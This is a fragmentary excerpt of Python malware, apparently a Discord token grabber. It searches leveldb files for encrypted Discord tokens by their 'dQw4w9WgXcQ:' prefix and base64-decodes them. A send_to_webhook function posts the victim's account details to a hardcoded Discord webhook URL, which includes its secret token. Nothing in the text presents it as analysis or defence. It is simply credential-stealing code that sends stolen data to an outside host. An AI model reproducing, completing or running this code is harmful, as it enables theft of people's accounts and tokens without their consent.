...
def send_to_webhook(token):
    ...
    avatar_url = f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar_hash}.png?size=512" if avatar_hash else None

    webhook_url = "https://discord.com/api/webhooks/1453344513476132916/z4j1HfIRBekSPjp1G0NmshYKVq-riiBw-7lbCGD4yFwsHwufQwRysi1y1lNYpXB1HF0l" 
    ...
    "fields": [
        ...
        {"name": "Locale", "value": f"```{locale}```", "inline": False},
...
for base_path in base_paths:
    ...
    for file_path in glob.glob(os.path.join(leveldb_path, "*.ldb")) + glob.glob(os.path.join(leveldb_path, "*.log")):
        try:
            with open(file_path, "rb") as f:
                content = f.read()
            
            import re
            encrypted_matches = re.findall(b'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)', content)
            
            for enc_b64 in encrypted_matches:
                try:
                    encrypted_token = base64.b64decode(enc_b64)
